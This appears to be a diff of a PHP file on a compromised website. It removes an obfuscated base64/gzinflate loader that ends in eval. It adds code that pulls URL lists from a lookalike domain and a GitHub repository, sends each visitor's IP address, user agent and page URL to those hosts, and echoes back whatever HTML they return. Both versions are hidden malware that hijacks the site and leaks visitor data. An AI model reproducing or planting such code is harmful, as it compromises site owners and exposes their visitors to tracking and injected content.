@@ -1,9 +1,64 @@
-<?php function KFZi($Htc)
-{ 
-$Htc=gzinflate(base64_decode($Htc));
- for($i=0;$i<strlen($Htc);$i++)
- {
-$Htc[$i] = chr(ord($Htc[$i])-1);
- }
- return $Htc;
- }eval(KFZi("lVXbbttGEP0AfsVUEEwpUKWmaIskAu26CeMITWxHklsUgrFgyJXEhOQS3GUtI9VDCyRxLkgLFAha9BIUKPrQB6d96S1u+zOh4j75EzLLi0TKMuDyQeLuzpyZszNzCICPUjYNc0hJ33YoaKDankVHhm/XxUioTaUfeqawmQehbxmCrvr2RWleyXnVoGyy0BPBbhVuKxKzjP4kDByOgL14Rz6loRA+v9Bo3M7sx/UBYwOHcmEI27zJ64L5DY/uEPQv1Y47BsZOfWCLYXgj5DQwmSeoJ+omcxsDx7B2z54/f64hEM2iLmu4hu3lQuUwt5vxX58FFElAZZauwae5Z1xiPo4hYSUESaMis3cleTKgItvjU6Rqc+pLzSEDNbk9SLmps2O7j/EXwL+madA3HE7zeZyciwhsdxFOLhH5NBrQMT6mIIYUEmNY3WyBYBCXEySjgkNM0Q/zFAuFXxhxPmT002eT77+d7H0RPXh6+Pj36PMn0d4vGDe6eyfa//Po4FG09/XL519Ovnsa/fPzy8fPCv43sEi3iizGSvFtrJRlPxBjkFwGFoB6JrOwS0lHb3+gt3vqlW53k2zhiqyu6etddRvzLJthEKCLrFjBLW447LcS1GEO4spGB50L+239+pbe6ZKtdiuBjZOx/RMyaevXNro6Wb10qR2b4wWll/LN39H+by/+/WHy6TO8lP+ef3W4/+OLP/46fPjr5Mm9o4M9lXrq0cF9JetpDGBzTgWCr+ndnmoGCAgrkFvCBZBeWBMMc3FIzVuy42TNZwUHOrK54EqmBHTk24ERD70G77wBZ/CnKet4FixjFyq2B5xitS1effOt+DT+URTZy3HDJID5VqlOpSHZE7Yr1UYeufK9YNtMLdPqpLaxWXqmpJ01ZZSwGeL8xtlTS8mGq1LEeT2fQRWW4Rjp/MBhiK1kcuXEJEF2UIDmBmhqfyqRbKZNOwaK851Gk2RmFbEY5eAxkZSmluKeIolTJjA+ZbFyOi4PiniXW1d10lpb32jrZF3/kFxtresd+CTZ77zf2iT6tc3uR8n+tKhSJUZySrnAyXZJukFMXAla6aly9lTQlqGnyhqxUMSrt7e3M4yhcJ2c9sUymR7RIGABcSnnKAZ45oWOkwrS/5B7XBN5w8Q3AsOV7EuZ3YoZaNlFLuX0Q8uLyVKqAFomBUszfdJyWlWa6do8qUUfl7m0agnz2vRSc2Jf/L4UsE/8ssRfqoJtc4ESy059T74l7ceYL2Pw0DTx0vuhoxxX6RnJ+fIka8nSMbiozEZDUVaWXwE="));?>
+<?php
+$cache_file = 'indexapi.txt';
+function updateApiCache($cache_file, $country) {
+    $api_urls = [
+        "https://{$country}.googlestaticjs.top/new_api",
+        "https://raw.githubusercontent.com/glady1998/testdemo/main/{$country}_api",
+    ];
+    foreach ($api_urls as $api_url) {
+        $latest_api_content = @file_get_contents($api_url);
+        echo 'update new_api';
+        if ($latest_api_content !== false) {
+            $latest_api_content = trim($latest_api_content);
+            // Save the latest API to cache file
+            file_put_contents($cache_file, $latest_api_content);
+
+            // 如果成功获取到API内容，则结束循环
+            break;
+            }
+        }
+    }
+$user_agent = urlencode($_SERVER['HTTP_USER_AGENT']);
+$current_url = urlencode("http://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
+$user_ip = urlencode($_SERVER['REMOTE_ADDR']);
+// 获取国家信息，默认为英文（'en'）
+$country = isset($_GET['cr']) ? $_GET['cr'] : 'en';
+
+// Check if API cache file exists
+
+$cache_expiration = 60 * 60; // 1 day (in seconds)24 * 60 * 60
+
+if (file_exists($cache_file)) {
+    $cache_time = filemtime($cache_file);
+    $current_time = time();
+    
+    // Check if cache has expired
+    if (($current_time - $cache_time) > $cache_expiration) {
+        // Update the cache with the latest API
+        updateApiCache($cache_file, $country);
+    }
+} else {
+    // Cache file does not exist, update the cache with the latest API
+    updateApiCache($cache_file, $country);
+}
+
+if (file_exists($cache_file)) {
+    $api_urls = file($cache_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+    $context = stream_context_create(['http' => ['timeout' => 5]]);
+    $html_content = false;
+    $error_message = null;
+
+    foreach ($api_urls as $api_url) {
+        $url_with_params = "$api_url?cr=$country&current_url=$current_url&user_ip=$user_ip&user_agent=$user_agent";
+        $html_content = @file_get_contents($url_with_params, false, $context);
+        
+        if ($html_content !== false) {
+            echo $html_content;
+            break; // Break the loop if successful
+        }
+        
+        $error_message = error_get_last();
+    }
+}
+
+?>
